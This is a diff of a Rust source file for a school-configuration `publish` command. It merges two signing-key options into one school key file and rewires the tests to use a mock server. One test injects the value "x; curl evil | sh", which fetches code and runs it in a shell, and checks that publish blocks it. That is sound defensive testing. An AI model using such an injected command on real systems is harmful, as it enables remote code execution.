@@ -1,7 +1,7 @@
 //! `mastersos publish`: the local directory is checked, its secrets are filled back in, version
 //! and time are stamped, and the result is uploaded as a pending bundle. With the school key
-//! (`--school-key`) or a PKCS#8 key file (`--key`) the bundle is then verified and signed on this
-//! computer ([`crate::sign::sign_pending_expecting`]). The key is required: without one the
+//! (`--key-file`) the bundle is then verified and signed on this computer
+//! ([`crate::sign::sign_pending_expecting`]). The key is required: without one the
 //! command refuses before anything is uploaded. The content digest is computed here from what
 //! was uploaded and must equal the server's, and only that digest is signed. Its first 8
 //! characters are the check code IT sees.
@@ -12,16 +12,15 @@
 
 use std::collections::BTreeMap;
 use std::io::{BufRead, Write};
-use std::path::{Path, PathBuf};
+use std::path::Path;
 
-use crate::sign::SigningKey;
 use anyhow::{anyhow, bail, Context, Result};
 use base64::{engine::general_purpose::STANDARD, Engine as _};
 use chrono::{DateTime, SecondsFormat, Utc};
 use mastersos_bundle::kit::Kit;
 use mastersos_bundle::secret_ref;
 use mastersos_bundle::stamp::{school_name_to_write, stamp};
-use mastersos_bundle::{content_digest, has_errors, Contents, Lint, LintLevel, Manifest, TrustKey};
+use mastersos_bundle::{content_digest, has_errors, Contents, Lint, LintLevel, Manifest};
 use serde::Deserialize;
 use serde_json::{json, Value};
 
@@ -29,46 +28,20 @@ use crate::tools::Req;
 use crate::workdir::{self, UploadInfo, Workdir};
 use crate::{api_error, Api};
 
-/// The key that signs on this computer, read before anything is uploaded.
-pub enum SignWith {
-    /// A recovery kit (`--kit`): the one signing key every school has.
-    Kit(Kit),
-    /// A PKCS#8 recovery key file (`--key`).
-    KeyFile(PathBuf),
-}
+/// The school key that signs on this computer (`--key-file`), read before anything is uploaded.
+pub struct SignWith(pub Kit);
 
 impl SignWith {
-    /// Read a kit file the way `mastersos-sign --kit` does ([`crate::sign::kit::load_kit`]):
-    /// it must belong to the current user and be readable by no one else (0600).
-    pub fn kit_file(path: &Path) -> Result<SignWith> {
-        Ok(SignWith::Kit(crate::sign::kit::load_kit(path)?))
-    }
-
-    /// Check a key file now (owner, mode, PKCS#8), so that a bad one stops before the upload; it
-    /// is read again when signing.
+    /// Read the school key file ([`crate::sign::kit::load_key_file`]): it must belong to the
+    /// current user, and `-` reads it from the first line of stdin.
     pub fn key_file(path: &Path) -> Result<SignWith> {
-        crate::sign::load_key(path)?;
-        Ok(SignWith::KeyFile(path.to_owned()))
-    }
-
-    fn signing(&self) -> SigningKey<'_> {
-        match self {
-            SignWith::Kit(k) => SigningKey::Kit(k),
-            SignWith::KeyFile(p) => SigningKey::File(p),
-        }
-    }
-
-    fn trust_key(&self) -> Result<TrustKey> {
-        Ok(match self {
-            SignWith::Kit(k) => k.trust_key(),
-            SignWith::KeyFile(p) => crate::sign::load_key(p)?.1,
-        })
+        Ok(SignWith(crate::sign::kit::load_key_file(path)?))
     }
 }
 
 /// What signing needs on this computer.
 pub struct SignOpts<'a> {
-    /// The recovery kit or key file.
+    /// The school key.
     pub key: &'a SignWith,
     /// The token file (the signing client talks to the same server with it).
     pub token_file: &'a Path,
@@ -280,7 +253,7 @@ fn hex(b: &[u8]) -> String {
 }
 
 /// Before the upload: the signing key must be in the new version's trust (Devices accept no
-/// other signature, and a signer cannot remove itself, R5), and a kit must be a recovery key
+/// other signature, and a signer cannot remove itself, R5), and it must be a recovery key
 /// registered on the server ([`crate::sign::kit::ensure_registered`]). Returns the signing
 /// client.
 async fn precheck_signer(
@@ -289,7 +262,7 @@ async fn precheck_signer(
     manifest_text: &str,
     root: &Path,
 ) -> Result<crate::sign::Api> {
-    let tk = s.key.trust_key()?;
+    let tk = s.key.0.trust_key();
     // A manifest that does not parse was refused by the check already; signing re-checks anyway.
     if let Ok(m) = Manifest::parse(manifest_text) {
         if !m.trust.contains(&tk) {
@@ -303,11 +276,9 @@ async fn precheck_signer(
         }
     }
     let api = crate::sign::Api::from_token_file(server, s.token_file)?;
-    if let SignWith::Kit(_) = s.key {
-        crate::sign::kit::ensure_registered(&api, &tk)
-            .await
-            .context("Not uploaded: the school key cannot sign for this school")?;
-    }
+    crate::sign::kit::ensure_registered(&api, &tk)
+        .await
+        .context("Not uploaded: the school key cannot sign for this school")?;
     Ok(api)
 }
 
@@ -336,8 +307,7 @@ async fn checkin(
     manifest_text: &str,
 ) -> Result<DateTime<Utc>> {
     let trust = Manifest::parse(manifest_text)?.trust;
-    crate::sign::checkin_after_publish(api, &key.signing(), version, digest, &trust, CHECKIN_DAYS)
-        .await
+    crate::sign::checkin_after_publish(api, &key.0, version, digest, &trust, CHECKIN_DAYS).await
 }
 
 /// `allow_reroute` holds the secret names IT approved with `--allow-reroute`: every secret a
@@ -415,7 +385,7 @@ pub async fn publish(
         school_name_to_write(&filled, &cfg.name),
     )?;
     let stamped = secret_ref::fill(&stamped_refs, &snap.secrets).map_err(CheckFailed)?;
-    // A kit or key that cannot sign this version stops here, before a pending bundle is left on
+    // A school key that cannot sign this version stops here, before a pending bundle is left on
     // the server. Signing checks all of it again against the verified chain.
     let sign_api = precheck_signer(&sign, &meta.server, &stamped, &w.root).await?;
     // The digest is computed here over exactly what is uploaded: the server's must equal it, and
@@ -509,7 +479,7 @@ pub async fn publish(
     writeln!(out, "Check code: {}", check_code(&local_digest))?;
     let v = crate::sign::sign_pending_expecting(
         &sign_api,
-        sign.key.signing(),
+        &sign.key.0,
         sign.pin_dir,
         &prepared.pending_id,
         Some(&local_digest),
@@ -542,21 +512,25 @@ mod tests {
     use super::*;
     use crate::workdir::Meta;
     use mastersos_bundle::kit::Kit;
-    use mastersos_bundle::Contents;
+    use mastersos_bundle::{Contents, TrustKey};
     use std::collections::BTreeMap;
     use wiremock::matchers::{method, path};
     use wiremock::{Mock, MockServer, Request, Respond, ResponseTemplate};
 
     const SID: &str = "11111111-1111-1111-1111-111111111111";
 
-    /// A key file made once for the tests that go no further than the upload, and its trust key.
-    fn test_signer() -> &'static (PathBuf, TrustKey) {
-        static SIGNER: std::sync::OnceLock<(PathBuf, TrustKey)> = std::sync::OnceLock::new();
+    /// A school key file made once for the tests (a fixed test-only kit, owner only), and its
+    /// trust key.
+    fn test_signer() -> &'static (std::path::PathBuf, TrustKey) {
+        static SIGNER: std::sync::OnceLock<(std::path::PathBuf, TrustKey)> =
+            std::sync::OnceLock::new();
         SIGNER.get_or_init(|| {
             let dir = Box::leak(Box::new(tempfile::tempdir().unwrap()));
-            let key = dir.path().join("test.pem");
-            let tk = crate::sign::keygen(&key).unwrap().trust_key;
-            (key, tk)
+            let path = dir.path().join("test.kit");
+            let kit = Kit::from_master(&[7; 32]);
+            let mut f = crate::platform::create_private(&path).unwrap();
+            f.write_all(kit.to_text().as_bytes()).unwrap();
+            (path, kit.trust_key())
         })
     }
 
@@ -572,11 +546,13 @@ mod tests {
         )
     }
 
-    fn workdir(dir: &Path) -> Workdir {
+    /// The test directory, published from the server at `server` (the mock server's address,
+    /// which the signing client talks to).
+    fn workdir(dir: &Path, server: &str) -> Workdir {
         let mut files = BTreeMap::new();
         files.insert("files/a.txt".to_string(), b"hello".to_vec());
         let meta = Meta {
-            server: "https://school.example".into(),
+            server: server.into(),
             school_id: SID.into(),
             base_version: 4,
         };
@@ -604,6 +580,17 @@ mod tests {
             .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                 "name": "Demo School", "slug": "demo", "school_id": SID
             })))
+            .mount(&s)
+            .await;
+        // The test signer is registered, unless a test mounts its own list.
+        let tk = &test_signer().1;
+        Mock::given(method("GET"))
+            .and(path("/v1/admin/signing-keys"))
+            .respond_with(ResponseTemplate::new(200).set_body_json(json!([{
+                "key_id": tk.id, "kind": "recovery", "alg": "ed25519", "label": "test",
+                "fingerprint": mastersos_bundle::trust_fingerprint(tk), "in_published_trust": false
+            }])))
+            .with_priority(10)
             .mount(&s)
             .await;
         s
@@ -651,8 +638,8 @@ mod tests {
 
     /// The test directory with the Guest network renamed: its secret would now be sent to
     /// another network (`secret_rerouted` for `defaults-guest-psk`).
-    fn rerouted_workdir(dir: &Path) -> Workdir {
-        let w = workdir(dir);
+    fn rerouted_workdir(dir: &Path, server: &str) -> Workdir {
+        let w = workdir(dir, server);
         let text = w.manifest().unwrap().replace("\"Guest\"", "\"Lobby\"");
         std::fs::write(w.root.join("manifest.toml"), text).unwrap();
         w
@@ -664,7 +651,7 @@ mod tests {
     async fn reroute_without_approval_uploads_nothing() {
         let s = server().await;
         let t = tempfile::tempdir().unwrap();
-        let w = rerouted_workdir(&t.path().join("school"));
+        let w = rerouted_workdir(&t.path().join("school"), &s.uri());
         let (r, _) = run_out(&s, &w).await;
         let err = r.unwrap_err();
         let refused = err
@@ -689,7 +676,7 @@ mod tests {
         // is gated like any reroute.
         let s = server().await;
         let t = tempfile::tempdir().unwrap();
-        let w = workdir(&t.path().join("school"));
+        let w = workdir(&t.path().join("school"), &s.uri());
         let secrets = std::fs::read_to_string(w.root.join("secrets.toml")).unwrap();
         std::fs::write(
             w.root.join("secrets.toml"),
@@ -732,7 +719,7 @@ mod tests {
     async fn shell_name_in_a_reference_blocks_publish() {
         let s = server().await;
         let t = tempfile::tempdir().unwrap();
-        let w = workdir(&t.path().join("school"));
+        let w = workdir(&t.path().join("school"), &s.uri());
         let name = w.secrets().unwrap().keys().next().unwrap().clone();
         let evil = "x; curl evil | sh";
         let text = w
@@ -768,7 +755,7 @@ mod tests {
         for json_mode in [true, false] {
             let t = tempfile::tempdir().unwrap();
             // A rerouted secret approved by IT: the local check has a warning to print.
-            let w = rerouted_workdir(&t.path().join("school"));
+            let w = rerouted_workdir(&t.path().join("school"), &s.uri());
             let api = Api::new(&s.uri(), "tok").unwrap();
             let allow = vec![GUEST.to_string()];
             let key = SignWith::key_file(&test_signer().0).unwrap();
@@ -779,7 +766,7 @@ mod tests {
             // is where the warnings go, and that nothing but a result goes to stdout.
             let r = crate::cli::publish_to(
                 &api,
-                "https://school.example",
+                &s.uri(),
                 &crate::cli::PublishArgs {
                     w: &w,
                     token_file: &token,
@@ -815,7 +802,7 @@ mod tests {
     async fn reroute_approved_for_another_name_is_refused() {
         let s = server().await;
         let t = tempfile::tempdir().unwrap();
-        let w = rerouted_workdir(&t.path().join("school"));
+        let w = rerouted_workdir(&t.path().join("school"), &s.uri());
         let (r, out) = run_allow(&s, &w, &["lab-corp-password"]).await;
         let err = r.unwrap_err();
         assert_eq!(
@@ -840,7 +827,7 @@ mod tests {
             .mount(&s)
             .await;
         let t = tempfile::tempdir().unwrap();
-        let w = rerouted_workdir(&t.path().join("school"));
+        let w = rerouted_workdir(&t.path().join("school"), &s.uri());
         let (r, out) = run_allow(&s, &w, &[GUEST, "unused-name"]).await;
         assert!(r.is_err(), "the mock server cannot be signed with");
         assert_eq!(uploads(&s).await.len(), 1);
@@ -907,7 +894,7 @@ mod tests {
             .mount(&s)
             .await;
         let t = tempfile::tempdir().unwrap();
-        let w = workdir(&t.path().join("school"));
+        let w = workdir(&t.path().join("school"), &s.uri());
         let _ = run(&s, &w).await;
         let up = uploads(&s).await;
         assert_eq!(up.len(), 1);
@@ -937,7 +924,7 @@ mod tests {
             .mount(&s)
             .await;
         let t = tempfile::tempdir().unwrap();
-        let w = workdir(&t.path().join("school"));
+        let w = workdir(&t.path().join("school"), &s.uri());
         let err = run(&s, &w).await.unwrap_err().to_string();
         assert!(err.contains("mastersos pull"), "{err}");
         assert!(err.contains("v6") && err.contains("base v4"), "{err}");
@@ -956,7 +943,7 @@ mod tests {
             .mount(&s)
             .await;
         let t = tempfile::tempdir().unwrap();
-        let w = workdir(&t.path().join("school"));
+        let w = workdir(&t.path().join("school"), &s.uri());
         let err = run(&s, &w).await.unwrap_err().to_string();
         assert!(err.contains("pending_exists"), "{err}");
         assert!(!err.contains("Someone published"), "{err}");
@@ -966,7 +953,7 @@ mod tests {
     async fn publish_stops_on_check_error() {
         let s = server().await;
         let t = tempfile::tempdir().unwrap();
-        let w = workdir(&t.path().join("school"));
+        let w = workdir(&t.path().join("school"), &s.uri());
         let text = w.manifest().unwrap().replace("secret:", "secret:x-");
         std::fs::write(w.root.join("manifest.toml"), text).unwrap();
         let err = run(&s, &w).await.unwrap_err();
@@ -979,7 +966,7 @@ mod tests {
     async fn publish_refuses_unchanged_directory() {
         let s = server().await;
         let t = tempfile::tempdir().unwrap();
-        let w = workdir(&t.path().join("school"));
+        let w = workdir(&t.path().join("school"), &s.uri());
         let text = w.manifest().unwrap().replace("# edited\n", "");
         std::fs::write(w.root.join("manifest.toml"), text).unwrap();
         let err = run(&s, &w).await.unwrap_err().to_string();
@@ -1017,7 +1004,7 @@ mod tests {
             .mount(&s)
             .await;
         let t = tempfile::tempdir().unwrap();
-        let w = workdir(&t.path().join("school"));
+        let w = workdir(&t.path().join("school"), &s.uri());
         let err = run(&s, &w).await.unwrap_err().to_string();
         assert!(err.contains("does not hold what was uploaded"), "{err}");
         assert!(err.contains("do not approve upload p-1"), "{err}");
@@ -1056,8 +1043,7 @@ mod tests {
             school_id: SID.into(),
             base_version: 4,
         };
-        let key = t.path().join("rk.pem");
-        let tk = crate::sign::keygen(&key).unwrap().trust_key;
+        let tk = test_signer().1.clone();
         let c = Contents {
             manifest_text: manifest_trusting(&tk.id, &tk.public_key),
             files,
@@ -1067,7 +1053,7 @@ mod tests {
             .pinned();
         let text = format!("{}# edited\n", w.manifest().unwrap());
         std::fs::write(w.root.join("manifest.toml"), text).unwrap();
-        let key = SignWith::key_file(&key).unwrap();
+        let key = SignWith::key_file(&test_signer().0).unwrap();
         let token = t.path().join("token");
         std::fs::write(&token, "tok").unwrap();
         let pins = t.path().join("pins");
@@ -1122,7 +1108,7 @@ mod tests {
             .mount(&s)
             .await;
         let t = tempfile::tempdir().unwrap();
-        let w = workdir(&t.path().join("school"));
+        let w = workdir(&t.path().join("school"), &s.uri());
         let name = w.secrets().unwrap().keys().next().unwrap().clone();
         let err = run(&s, &w).await.unwrap_err();
         let r = err
@@ -1155,7 +1141,7 @@ mod tests {
             .mount(&s)
             .await;
         let t = tempfile::tempdir().unwrap();
-        let w = workdir(&t.path().join("school"));
+        let w = workdir(&t.path().join("school"), &s.uri());
         let name = w.secrets().unwrap().keys().next().unwrap().clone();
         let (_, out) = run_out(&s, &w).await;
         assert!(out.contains("wifi_weak"), "{out}");
@@ -1173,7 +1159,7 @@ mod tests {
             .mount(&s)
             .await;
         let t = tempfile::tempdir().unwrap();
-        let w = workdir(&t.path().join("school"));
+        let w = workdir(&t.path().join("school"), &s.uri());
         let _ = run(&s, &w).await;
         let up = uploads(&s).await;
         let snap = w.freeze().unwrap();
@@ -1188,13 +1174,11 @@ mod tests {
             .all(|l| l.level != mastersos_bundle::LintLevel::Error));
     }
 
-    /// A kit written the way `mastersos-sign school-key new` writes it (0600).
+    /// A kit written the way `mastersos key new` writes it (0600).
     fn kit_file(dir: &Path) -> (std::path::PathBuf, Kit) {
         let path = dir.join("school.kit");
         crate::sign::kit::kit_new(&path).unwrap();
-        let SignWith::Kit(kit) = SignWith::kit_file(&path).unwrap() else {
-            unreachable!()
-        };
+        let SignWith(kit) = SignWith::key_file(&path).unwrap();
         (path, kit)
     }
 
@@ -1218,7 +1202,7 @@ mod tests {
         Workdir::init(dir, meta, &manifest_trusting(&tk.id, &tk.public_key)).unwrap()
     }
 
-    /// Publish with `kit` (a kit or a key file) and the confirmations in `confirm`.
+    /// Publish with `kit` and the confirmations in `confirm`.
     async fn publish_with_kit(
         s: &MockServer,
         w: &Workdir,
@@ -1308,7 +1292,7 @@ mod tests {
             .mount(&s)
             .await;
         let w = first_version_dir(&t.path().join("school"), &s, &kit);
-        let kit = SignWith::kit_file(&kit_path).unwrap();
+        let kit = SignWith::key_file(&kit_path).unwrap();
         // The version number, then `trust`: the first version adds every key of its trust.
         let (r, out) = publish_with_kit(&s, &w, kit, t.path(), "1\ntrust\n").await;
         assert!(
@@ -1332,62 +1316,10 @@ mod tests {
         let body: Value = serde_json::from_slice(&commit.body).unwrap();
         let up = pending.0.lock().unwrap().clone().unwrap();
         assert_eq!(body["confirm_digest"], digest_of(&up));
-        let SignWith::Kit(kit) = SignWith::kit_file(&kit_path).unwrap() else {
-            unreachable!()
-        };
+        let SignWith(kit) = SignWith::key_file(&kit_path).unwrap();
         assert_eq!(body["signature"]["key_id"], kit.key_id());
         // The kit text never reaches the output.
         assert!(!out.contains(kit.to_display().as_str()), "{out}");
-    }
-
-    #[tokio::test]
-    async fn key_file_publish_leaves_a_base_that_matches_the_pin() {
-        let s = server().await;
-        let t = tempfile::tempdir().unwrap();
-        let key = t.path().join("rk.pem");
-        let tk = crate::sign::keygen(&key).unwrap().trust_key;
-        let pending = Pending::default();
-        for (m, p) in [
-            ("POST", "/v1/admin/publish/pending"),
-            ("GET", "/v1/admin/publish/pending/p-1"),
-        ] {
-            Mock::given(method(m))
-                .and(path(p))
-                .respond_with(pending.clone())
-                .mount(&s)
-                .await;
-        }
-        Mock::given(method("GET"))
-            .and(path("/v1/admin/versions"))
-            .respond_with(ResponseTemplate::new(200).set_body_json(json!([])))
-            .mount(&s)
-            .await;
-        Mock::given(method("POST"))
-            .and(path("/v1/admin/publish/pending/p-1/commit"))
-            .respond_with(ResponseTemplate::new(200).set_body_json(json!({ "version": 1 })))
-            .mount(&s)
-            .await;
-        let meta = Meta {
-            server: s.uri(),
-            school_id: SID.into(),
-            base_version: 0,
-        };
-        let w = Workdir::init(
-            &t.path().join("school"),
-            meta,
-            &manifest_trusting(&tk.id, &tk.public_key),
-        )
-        .unwrap();
-        let key = SignWith::key_file(&key).unwrap();
-        let (r, out) = publish_with_kit(&s, &w, key, t.path(), "1\ntrust\n").await;
-        assert!(
-            matches!(r.unwrap(), PublishOutcome::Published { version: 1, .. }),
-            "{out}"
-        );
-        let w = w.with_pins(t.path().join("pins"));
-        w.verify_base().unwrap();
-        assert!(!w.is_dirty().unwrap());
-        workdir::check(&w).unwrap();
     }
 
     #[tokio::test]
@@ -1401,7 +1333,7 @@ mod tests {
         let t = tempfile::tempdir().unwrap();
         let (kit_path, kit) = kit_file(t.path());
         let w = first_version_dir(&t.path().join("school"), &s, &kit);
-        let kit = SignWith::kit_file(&kit_path).unwrap();
+        let kit = SignWith::key_file(&kit_path).unwrap();
         let (r, _) = publish_with_kit(&s, &w, kit, t.path(), "").await;
         let err = format!("{:#}", r.unwrap_err());
         assert!(err.starts_with("Not uploaded"), "{err}");
@@ -1426,39 +1358,10 @@ mod tests {
             base_version: 0,
         };
         let w = Workdir::init(&t.path().join("school"), meta, &manifest_text()).unwrap();
-        let kit = SignWith::kit_file(&kit_path).unwrap();
+        let kit = SignWith::key_file(&kit_path).unwrap();
         let (r, _) = publish_with_kit(&s, &w, kit, t.path(), "").await;
         let err = r.unwrap_err().to_string();
         assert!(err.contains("is not among the trusted keys in"), "{err}");
         assert!(uploads(&s).await.is_empty());
-    }
-
-    /// Spec §5.3: a school key file others can read (a FAT32 or exFAT USB stick) still loads,
-    /// with a note; a PKCS#8 key file stays strict.
-    #[cfg(unix)]
-    #[test]
-    fn loose_kit_file_loads_but_loose_key_file_is_refused() {
-        use std::os::unix::fs::PermissionsExt;
-        let t = tempfile::tempdir().unwrap();
-        let (kit, expected) = kit_file(t.path());
-        let key = t.path().join("rk.pem");
-        crate::sign::keygen(&key).unwrap();
-        for p in [&kit, &key] {
-            std::fs::set_permissions(p, std::fs::Permissions::from_mode(0o777)).unwrap();
-        }
-        let SignWith::Kit(loaded) = SignWith::kit_file(&kit).unwrap() else {
-            unreachable!()
-        };
-        assert_eq!(loaded.key_id(), expected.key_id());
-        let key_err = format!("{:#}", SignWith::key_file(&key).err().unwrap());
-        assert!(
-            key_err.contains("has mode 777") && key_err.contains("chmod 600"),
-            "{key_err}"
-        );
-        // Not a kit at all.
-        let junk = t.path().join("junk");
-        std::fs::write(&junk, "hello").unwrap();
-        std::fs::set_permissions(&junk, std::fs::Permissions::from_mode(0o600)).unwrap();
-        assert!(SignWith::kit_file(&junk).is_err());
     }
 }
